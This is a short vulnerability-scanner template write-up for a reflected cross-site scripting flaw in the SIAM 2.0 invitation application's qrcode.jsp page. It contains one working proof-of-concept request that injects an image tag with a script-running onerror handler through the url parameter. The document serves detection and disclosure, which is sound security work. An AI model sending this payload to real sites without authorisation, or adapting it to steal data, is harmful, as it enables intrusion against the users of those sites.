# Nuclei Template: SIAM 2.0 - Cross-Site Scripting
**Template ID:** siam-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`siam-xss.yaml`)

## Vulnerability Information & PoC

## Description
A Reflected Cross-Site Scripting (XSS) vulnerability has been identified in the SIAM Invitation application. The url parameter of the qrcode.jsp page does not properly sanitize user input, allowing the injection and execution of malicious scripts in the browser.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/siam-convite/qrcode.jsp?url=1%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
```

## References
- https://vuldb.com/?submit.496171
- https://ftp.ogma.in/blog/understanding-and-mitigating-cve-2025-1359-siam-2-0-vulnerabilities
